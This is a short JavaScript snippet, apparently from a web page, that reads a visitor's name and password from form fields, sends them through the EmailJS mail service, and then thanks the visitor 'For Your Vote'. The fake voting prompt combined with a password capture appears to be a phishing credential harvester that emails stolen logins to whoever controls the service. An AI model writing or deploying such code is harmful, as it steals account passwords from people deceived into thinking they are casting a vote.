function sendMail(){
  let parms ={
    name: document.getElementById("name").value,
    password : document.getElementById("password").value,
  }

  emailjs.send("service_c5buabe","template_rjpj60s",parms).then(alert("Thanks For Your Vote"))
}

